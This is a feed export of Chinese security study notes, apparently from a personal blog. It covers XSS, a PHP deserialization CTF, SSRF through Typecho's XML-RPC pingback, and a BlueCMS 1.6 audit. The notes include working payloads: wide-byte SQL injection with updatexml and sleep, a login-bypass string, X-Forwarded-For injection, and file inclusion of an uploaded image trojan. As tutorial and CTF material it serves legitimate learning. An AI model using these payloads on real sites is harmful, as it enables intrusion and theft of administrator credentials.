title="XSS的作用："></a>XSS的作用：</h2><ul><li>盗取管理员cookie</li><li>获得内网的ip</li><li>获取浏览器保存的明文密码</li><li>截取网页的屏幕</li><li>网页的键盘输入记录</li><li>……</li></ul><p>##XSS的类型：</p><ul><li><strong>反射型XSS：</strong>实现xss攻击，但不存进数据库，只对你这次访问有影响，是中非持久型的攻击（一次性的）；</li><li><strong>存储型：</strong>实现了xss攻击，但存进了数据库，每次有人访问这个页面，都会自动触发；</li><li><strong>DOM型XSS：</strong>不经过后端，DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞，dom – xss是通过url传入参数去控制触发的。</li></ul><h3 id="检测是否存在XSS："><a href="#检测是否存在XSS：" class="headerlink" title="检测是否存在XSS："></a>检测是否存在XSS：</h3><p>最简单的就是构造语句，使页面弹窗，我们在正常页面传参构造参数使他弹窗，如果弹窗，这证明就是存在xss；</p><p><strong>xss其实是通过执行js的代码去执行一些恶意代码，其实有多种方法去执行js语句：</strong></p><ul><li>我们可以通过构造js标签对<script></script>去执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alter&apos;123456&apos;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>也可以通过JavaScript伪协议去触发即声明URL的主体是任意的javascript代码；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;a href=javascript:alter(123456)&gt;1&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li>也可以通过事件去触发(就是加载文档或图像时触发了事件时去再执行js代码,常见有onload(成功加载执行)，onerror(加载失败执行)，oninput(输入时执行),onclick(点击时执行))；</li></ul><p>通过插入错误的图片路径，使他加载失败时去执行js代码：</p><pre><code>?id=&lt;img src=&apos;6666&apos; onerror=alert&apos;123456&apos;&gt;</code></pre><p>以上举例都是属于反射型的xss，需要手动去执行，然后触发我们去插入的代码效果；</p><p>当然还有许多转义的情况存在，我们需要一步步检查，想办法去变形绕过，从而去执行我们想要的结果；</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP unserialize反序列化漏洞</title>
      <link href="/2019/12/07/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是序列化-serialize"><a href="#什么是序列化-serialize" class="headerlink" title="什么是序列化(serialize)?"></a>什么是序列化(serialize)?</h2><p>序列化(serialize)是将对象的状态信息<strong>转换为可以存储或传输</strong>的过程，在序列化期间，对象将其当前状态写入到临时或持久性存储区，然后<strong>可以从存储区读取或反序列化出对象的状态，</strong>重新将对象创建出来。通俗的说，就是将php中对象、类、数组、变量匿名函数转化为字符串，方便保存到数据库或文件中。</p><p>在php中，可以通过serialize()函数来将对象转变成一个字符串，保存对象的值，方便之后使用或传递。</p><h2 id="什么是反序列化-unserialize"><a href="#什么是反序列化-unserialize" class="headerlink" title="什么是反序列化(unserialize)?"></a>什么是反序列化(unserialize)?</h2><p>序列化就是将对象的状态信息转为字符串存储起来，那么反序列化就是再将信息状态拿出来使用(重新转化为对象或者其他)；</p><h2 id="反序列化漏洞的产生"><a href="#反序列化漏洞的产生" class="headerlink" title="反序列化漏洞的产生"></a>反序列化漏洞的产生</h2><p>本质上serialize()和unserialize()在PHP内部实现上时没有漏洞的，漏洞的**主要产生是由于应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p><p>当传给unserialize()的<strong>参数可控</strong>时,那么用户就可以精心构造的payload。当进行反序列化的时候就有可能会触发对象中一些<strong>魔术方法</strong>，造成意向不到的危害。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wfphoej31hc0q876u.jpg" alt><br><strong>序列化对于不同类型得到的字符串格式为：</strong></p><ul><li>String : s:size:value;</li><li>Integer : i:value;</li><li>Boolean : b:value;(1或0)</li><li>Null : N;</li><li>Array : a:size:{key definition;value definition;(repeated per element)}</li><li>Object : O:strlen:object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</li></ul><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>_construct()， <strong>destruct()， </strong>call()， <strong>callStatic()， </strong>get()， <strong>set()， </strong>isset()，<strong>unset()， </strong>sleep()， <strong>wakeup()， </strong>toString()， <strong>invoke()， </strong>set_state()，<strong>clone() 和 </strong>debugInfo() 等方法在 PHP 中被称为”魔术方法</p><p>魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用模式方法可以轻松实现PHP面向对象中重载。<br>我们先简单介绍几个魔术方法，如果想详细了解的话，点击<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">魔术方法</a>;</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>当我们调试程序时，需要知道是否得出正确的数据。比如打印一个对象时，看看这个对象都有哪些属性，其值是什么，如果类定义了toString方法，就能在测试时，<strong>echo打印对象体，对象就会自动调用它所属类定义的toString方法，</strong>格式化输出这个对象所包含的数据。</p><h3 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h3><p>当对象创建(new)时会主动调用。但在unserialize()时是不会自动调用的。（构造函数）</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>当对象被销毁时自动调用（析构函数）</p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>如前所提，unserialize()时会自动调用；</p><h2 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h2><p>我们进入靶场，我们看到这样一个界面，他叫我们检查代码，那我们就点进去把！<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wrzoupj31h70q8dgk.jpg" alt><br>这是一道ctf反序列化题目，看到提示flag就藏在本页面中同一目录的flag.php中，我们审计下代码<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0x1m4jej31hc0regmc.jpg" alt><br>①.前面定义了一个类，类中定义了一个方法，而且还是使用魔术方法<strong>toString,里面返回了readme.txt和调用显示source,因为在</strong>toString魔术方法中，所以只要将对象体打印(echo)出来就能调用。<br>highlight_file是高亮显示文件代码的意思；</p><p>②.在第一个if判断中，如果存在source以GET方式请求的话，就会实例化对象，并使source=<strong>FILE</strong>,<strong>FILE</strong>指本地当前文件路径，那就是说会调用$s对象中的source并使其等于<strong>FILE</strong>,<strong>FILE</strong>表示当前页面的完整路径，即会读取当前页面，并将对象体打印出来，那么上面的__toSteing也会被调用。</p><p>③.如果有存在todos这个cookie，那就<strong>截取cookie前32位长度，与前32位之后长度相对比，如果相等，就将cookie前32位之后的长度进行反序列化。</strong>那如果$_COOKIE[‘todos’]是可控的，那我们能不能<strong>构造payload让②的<strong>FILE</strong>文件改成我们想读取的flag.php文件，并将其序列化，并放到cookie中，并使条件成立，使得将我们想要文件被反序列化后输出出来</strong>，但我们还没看到输出的点。</p><p>后面我们发现了这个<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xew1wlj30hg0p8q37.jpg" alt><br>&lt;?=$todo?&gt;是&lt;?php echo $todo ?&gt;的简写；<br>而$todo是根据$todos数组 foreach遍历出来的值</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xm802pj31hb0f9aaf.jpg" alt><br>我们将<strong>FILE</strong>改成我们要读取的文件名，<strong>因为只有数组才能foreach遍历出值，所以我们要将序列化的对象先转换成数组</strong>，然后是序列化出来结果。</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xvqj2aj30f404uq2r.jpg" alt><br>然后我们要做的下一步是通过让cookie满足条件，使cookie前32位与之后的相等，如果条件成立，那么就会实行反序列化出结果，并将其结果赋给$todos这个数组，然后遍历flag.php输出结果。那么，我们只需要将我们序列化的结果拼接都放进cookie中去，使其条件满足，反序列化出我们需要的结果</p><p>因为cookie前32位$h要等于32位之后md5加密后的值$m，所以我们要手动将前32位进行手动md5加密，使其等于32位以后的值。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0y37gnij31hc0rh77y.jpg" alt><br><code>$h=e2d4f7dcc43ee1db7f69e76303d0105c(手动md5加密)</code><br><code>$m=a:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}}</code><br><code>md5($m)=e2d4f7dcc43ee1db7f69e76303d0105c</code></p><p>所以最后所生成cookie为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">todos=&gt;e2d4f7dcc43ee1db7f69e76303d0105ca:1:&#123;i:0;O:6:&quot;readme&quot;:1:&#123;s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>因为生成cookie会主动进行一次url编码，然后存储后会进行一次url解码，因为我们手动生成cookie，所以我们要进行一次url编码，再将其放到cookie中去<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0ydiyo7j31hc0ipjwd.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0yuvdqej31ax0crwig.jpg" alt><br>将其放入cookie中，刷新，成功拿到flag；<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0zpxd5ej31hc0h6q4a.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-服务器端请求伪造</title>
      <link href="/2019/12/07/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2019/12/07/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF?"></a>什么是SSRF?</h1><p>SSRF(Server-Side Request Forgery:<strong>服务器端</strong>请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的<strong>内部系统</strong>。（因为他是从内部系统访问的，所以可以通过它攻击外网无法访问的<strong>内部系统(即内网)</strong>，也就是把目标网站当中间人;即<strong>利用一个可发起网络请求的服务当做跳板来攻击其他服务;</strong></p><p>通俗的说就是浏览器去访问服务都是通过浏览器本地去访问的，而SSRF就是攻击者通过命令服务器端去访问另一个服务，<strong>服务器端去访问</strong>并返回了访问数据</p><h2 id="SSRF原理详解"><a href="#SSRF原理详解" class="headerlink" title="SSRF原理详解"></a>SSRF原理详解</h2><p>首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站并可以发起网络请求，B网站是一个他们内部的OA网站。</p><p>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以通过a网站做中间人，<strong>让a网站去代替我们去访问b网站，并返回数据，</strong>从而达到攻击b网站需求。那如果b网站是个内网网站，那我们就可以去通过a网站进入<strong>攻击外网无法访问的内网系统</strong>，攻击所在内网中网站、程序；</p><h2 id="SSRF的作用"><a href="#SSRF的作用" class="headerlink" title="SSRF的作用"></a>SSRF的作用</h2><ul><li>扫描内部网络(FingerPrint)(对输入连接没有限制，可以直通内网)</li><li>向<strong>内部</strong>主机的<strong>任意主机</strong>的<strong>任意端口</strong>发送我们精心构造的数据表(payload)</li><li>DDOS(请求大文件，始终保持连接Keep-Alive Alway)</li><li>暴力穷举(users/dirs/files)</li><li>内外网Web站点漏洞的利用(比如内网网站存在sql注入，因为是内网，网站管理员防范意识较低，那我们就可以通过存在漏洞达到我们的目的)</li><li>内外网主机应用程序漏洞的利用</li></ul><p>##靶场实战<br>我们进入靶场<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e2wptko9j31h90fyglw.jpg" alt><br>发现访问的是一个xmlrpc服务，但该服务<strong>只接受POST请求</strong>；我们发现这是一个typeecho的CMS,这个CMS是默认开启了XMLRPC服务的</p><p><strong>XML RPC</strong><br>(XML-RPC是一个远程过程调用（远端程序呼叫）（remote procedure call，RPC)的分布式计算协议，通过XML将调用函数封装，并使用http协议做为传输协议的rpc机制，使用xml文本的方式传输命令和数据。)</p><p>XMLRPC中有一个叫做pingback协议(pingback,<strong>通知网志系统文章被引用</strong>情况的一种手段)，我们可以直接使用；</p><p>POC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line"> &lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line"> &lt;params&gt;</span><br><span class="line">    &lt;string&gt;http://127.0.0.1:1&lt;/string&gt;</span><br><span class="line"> &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure><p>通过刷新抓包，将请求方式修改为POST方式，并将poc代码放到下面<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4norujuj30z40qf40e.jpg" alt><br>这段poc说简单点，就是他会通过服务器端去ping内网的地址，并返回信息，通过返回信息知道端口的开放。<br>由于我们不知道开放端口，所以通过burp进行端口爆破<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4o051cyj30z40ouq6c.jpg" alt><br>发现开放了两个端口，我们通过提示知道了内网88端口映射12388端口,<br>我们对12388端口进行访问，抓包看返回头，得到flag<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4oa3liaj30z40ovju0.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入--0day审计案例(二)</title>
      <link href="/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(2)/"/>
      <url>/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(2)/</url>
      
        <content type="html"><![CDATA[<p>我们开始进行代码审计、漏洞挖掘</p><h3 id="网站重装漏洞"><a href="#网站重装漏洞" class="headerlink" title="网站重装漏洞"></a>网站重装漏洞</h3><p>一般我要做一个CMS网站，首先要访问目录中的安装目录，进行安装、注册管理员账号。那我们站在黑客角度上想一想，我们如果知道了一个cms的安装目录路径，那我们是不是能进行二次访问进行重新安装呢？这样的话我们是不是就可以重置管理员账号和密码，登入后台进行getshell呢？<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418sjhanvj31h60rbwgy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418t83yofj31h90pwdj9.jpg" alt><br>这样我们就可以进行重新安装了，而数据库账号密码，我们可以弄一个虚拟空间数据库，比如注入时用到的香港云。</p><h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><p>我们再来看这个网站，一般而言网站有展示类和功能类。</p><p>展示类（比如新闻站、门户站）</p><p>功能类（比如商城、OA、系统）</p><p>我们看到前台有一个注册功能，如果我们可以拿到一个普通用户的权限是不是更加容易渗透测试？测试的点是不是更多？<br>那么我们去注册一个账户吧！<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418thvsawj31h80osac3.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418tqqwkwj31h60qkdi5.jpg" alt><br>在注册之前，我们先开下burp，看下提交注册的数据包发往哪里去<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418u2kpw2j31gj0qhq6z.jpg" alt><br>发现它通过post方式将参数发送user.php ,我们注意到里面有act传进参数do_reg,我们通过代码审计工具找到user.php<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ub5ui9j31hc0sgk2s.jpg" alt><br>我们发现这里是检查传进来的注册参数是否为空和有没有空格，并且加入一些检查格式<br>而我们在下面发现sql插入语句<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uije5fj313b0i4tdu.jpg" alt><br>发现它并没有将注册的值进行过滤，而直接插入数据库中。那么这就很有可能存在XSS和sql注入。</p><p>我们先通过一个弹窗看看是否有xss，先抓一个包，并对其邮箱进行插入弹窗语句<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uxubm8j30z40rkq4p.jpg" alt><br>成功弹窗，这里是一个存储型的XSS。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wavb2qj31h80pqjt2.jpg" alt></p><h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><p>在插入语句中<br><code>&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#39;&#39;, &#39;$user_name&#39;, md5(&#39;$pwd&#39;), &#39;$email&#39;, &#39;$timestamp&#39;, &#39;$timestamp&#39;)&quot;;</code><br>这里插入没有过滤，由于email变量由一对单引号包着，所以我们试着在邮箱后面加个’,看看是否会报错<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br>发现还是注册成功了，那我们进后台看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wxhl9tj30z50h1wfx.jpg" alt><br>发现’好像被实体化了，就是被\转义了，这好像是php配置中开启了魔术引号，那我们应该想到之前的宽字节注入，在引号前加%df，使其与\%5c合并,从而避免’被转义。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418x765fgj30z40rktag.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xeyzpej30z40rkjtw.jpg" alt><br>发现报错了，那就说明存在注入<br>尝试使用updatexml的报错<br>构建下语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.com�\&apos; or updatexml(1,concat(0x7e,(SELECT database())),1),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure></p><p>发现报错，没有显示我们想要的信息<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xro0upj30z40rkacp.jpg" alt><br>但我发现放进数据库执行，却能成功(需将%df\  去掉)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xzi127j31560lgaeh.jpg" alt><br>那我们只能通过盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.com�\&apos; or sleep(10),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure></p><p>以这种格式继续盲注下去。</p><p>但我们想到，insert into 是能插入多条数据呢，那我们是不是能通过语句构建，再建立一个用户，然后用子查询填充邮箱处，然后我们登陆这个账号是不是就可以看到邮箱字段里面的内容？<br>我们先抓包<br>这样就插入了两组数据，而在第二组数据中的邮箱就是管理员密码<br>我们执行一下，发现执行失败<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ydsotkj30z40rktbf.jpg" alt><br>因为这里魔术引号会将引号转义，所以我们利用宽字节知识，将其转为16进制编码<br>allblue2019==&gt;0x616C6C626C756532303139<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yodkozj30z40rkq6i.jpg" alt><br>注册成功，登录<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yzxxk0j31gg0ovtaj.jpg" alt><br>将邮箱值进行md5解密，成功得到管理员密码<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418z7jwb3j31ha0ky3zn.jpg" alt></p><h3 id="登录框万能密码登录"><a href="#登录框万能密码登录" class="headerlink" title="登录框万能密码登录"></a>登录框万能密码登录</h3><p>我们尝试登录抓包<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zidhbij30z40rk760.jpg" alt><br>找到传参的位置，在审计工具查找<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zussp9j31hc0sm49l.jpg" alt><br>发现这里判断了是否为管理员，没有对登录参数进行限制，这可能存在POST注入<br>post注入，首先尝试着使用万能密码登录<br><code>%df&#39;) or 1=1#</code><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41902f5r4j30z40rkwg9.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190a2wpfj31hb0i6aae.jpg" alt><br>成功登录<br>然后登录后修改资料处也存在SQL注入和XSS</p><h3 id="X-Forwarded-For注入"><a href="#X-Forwarded-For注入" class="headerlink" title="X-Forwarded-For注入"></a>X-Forwarded-For注入</h3><p>我们通过一个普通用户发布了新闻<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190jiyuoj31hc0lndhp.jpg" alt><br>通过重新注册一个用户对其进行评论<br>评论成功<br>那么这可能也存在XSS。<br>我们评论时先抓个包看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193ify2nj31hc0mlq4z.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193tropfj30z40rkwgc.jpg" alt><br>发现他会将参数send提交到comment.php,那么我们去看一看</p><p>我们发现这里面有一些函数<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194117l1j31hc0sm116.jpg" alt></p><ul><li><p>intval()<br>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></li><li><p>htmlspecialchars()<br>把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体</p></li><li><p>nl2br()<br>在字符串中的新行（\n）之前插入换行符<br>所以XSS肯定是没戏了。</p></li></ul><p>这时，我们看到了他在插入的时候，记录了评论用户的ip，我们发现了getip函数，我们定位一下函数<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194argjyj31dy0q7n3k.jpg" alt><br>找到了定义的函数，这里有一个getenv，实际上就是获取系统的环境变量</p><p>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</p><p>第二个X-Forwarded-For是个扩展请求头，这个东西可以通过HTTP请求头来修改。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194mh7qkj31cy0oudle.jpg" alt><br>那么我们是不是可以修改X-Forwarder-For的参数，将参数插入到ip中，那么ip的值就会放入sql语句中执行呢?<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194usqr2j31h90nxtas.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41953pdecj30zh0kydhq.jpg" alt><br>我们给个分号测试一下<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195bynenj31ga0nltar.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195kp9p5j31hc0fdt8t.jpg" alt><br>发现成功报错<br>因为X-Forwarded-For是直接获取的，所以不会出现魔术引号。<br>这里我们直接用sqlmap 就能直接跑出来了<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195ssd3yj30xz0hrq4w.jpg" alt></p><h3 id="数据库备份文件泄露"><a href="#数据库备份文件泄露" class="headerlink" title="数据库备份文件泄露"></a>数据库备份文件泄露</h3><p>有时候，管理员在备份数据库的时候，直接默认将备份文件直接放在网站目录下，这样其实是很危险的，很容易被黑客摸出来。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41964opglj31hc0omjv5.jpg" alt><br>我们登入后台，发现了一个数据库备份，好，那我们将数据库备份<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196cvcatj31hc0bsdgs.jpg" alt><br>我们到网站目录看一下<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196lq5n3j30st05pt8r.jpg" alt><br>发现他的命名规则是备份的年月日，那如果我们拿到一个CMS，知道他的备份目录，是不是可以尝试着爆破一下备份文件<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196v5eboj31gt0q4wft.jpg" alt></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含，首先需要找到包含函数<br>我们在找到了一个貌似可以控制的include函数，不过需要act参数=pay的时候才能执行<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419766cocj31e10osn4c.jpg" alt><br>最后在购买充值卡那找到<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197f34tlj31hc0m241t.jpg" alt><br>我们先找到一个能上传图片马的上传点<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197mhek1j31h90jqtac.jpg" alt><br>成功上传<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197vln3uj31h80k40t7.jpg" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/&apos;.$_POST[&apos;pay&apos;].&quot;/index.php&quot;;</span><br></pre></td></tr></table></figure></p><p>文件包含的路径</p><p>那么我们将木马路径传入到post参数中，那么路径为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay=../../data/upload/face_pic/15605135978.jpg</span><br></pre></td></tr></table></figure></p><p>这样的话，包含语句就会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/../../data/upload/face_pic/15605135978.jpg/index.php&quot;;</span><br></pre></td></tr></table></figure></p><p>但是这样的话，后面还有个index。php，他会去加载index.php,会对加载图片马有所影响，那么我们需要将index.php截取掉，这里00截断试过了，php低版本才会存在这样的截断。</p><p>在这里我们可以尝试一个字符串截断的方法（Windows的路径不能超过60个字符）在Windows API中，路径的最大长度为MAX_PATH，MAX_PATH被定义为260。</p><p>那么我们是不是可以尝试在传参的后面加点进行截断，因为点最后会被windows给处理掉，但是填充了点之后，只会保留包含前面15605093967.png，在传参后的index.php因为路径超过260个字符后的东西都会被舍弃，于是乎我们直接传参后加260个点就可以截断了。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4198wnf3nj30z40ni0ue.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419azj97kj30h10n73zx.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入--0day审计案例(1)</title>
      <link href="/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(1)/"/>
      <url>/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>这次我们讲的是一篇适合新手学习的代码审计，因为是给小白学习的代码审计，所以可以利用黑盒+白盒交叉审计的情况下，更好的帮助小白学习并找出漏洞。</p><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>phpstudy<br>BlueCMS1.6 sp1源码<br>代码审计工具(Seay源代码审计系统)</p><h3 id="审计思路："><a href="#审计思路：" class="headerlink" title="审计思路："></a>审计思路：</h3><p>一般来说，有一定代码功力的人审计代码,会直接将全文代码通读一遍，并寻找传参进行代码审计，但这是对有一定代码功力的人而言。</p><p>而对小白而言，利用黑盒和白盒交叉审计的情况下，更能帮助我们找到漏洞。</p><p>我们拿到一个CMS后，可以<strong>先寻找功能点</strong>，然后将功能点罗列出来，并对其功能点进行不断测试，然后在拿到代码的情况下，我们可以<strong>对功能点所对应的传参进行审计，那如果知道了传参的意义，就等于知道代码会去做什么，要去做什么了呢</strong>。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znruehwoj30za0rkjud.jpg" alt></p><h3 id="大概测试流程："><a href="#大概测试流程：" class="headerlink" title="大概测试流程："></a>大概测试流程：</h3><ul><li><strong>总结功能点</strong></li><li><strong>黑盒测试功能点：</strong></li></ul><p>①黑盒测试测不出来的地方进行白盒审计</p><p>②测试结果进行白盒审计</p><h3 id="Seay源码审计系统"><a href="#Seay源码审计系统" class="headerlink" 